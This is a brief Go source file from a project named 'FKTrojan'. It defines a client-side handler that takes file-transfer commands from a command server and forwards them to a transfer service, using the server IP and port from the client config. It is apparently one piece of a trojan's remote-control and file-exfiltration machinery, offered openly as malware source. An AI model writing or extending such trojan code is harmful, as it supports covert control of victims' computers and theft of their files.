package command_handler_client

import (
	"FKTrojan/config_client"
	. "FKTrojan/dao"
	"FKTrojan/service_transfer"
)

func transferCmd(cmd *Command) error {
	// 从命令端接收到的传输命令，转到传输服务
	return service_transfer.TransFile(config_client.Conf.ServerIp, config_client.Conf.TransPort, cmd)
}
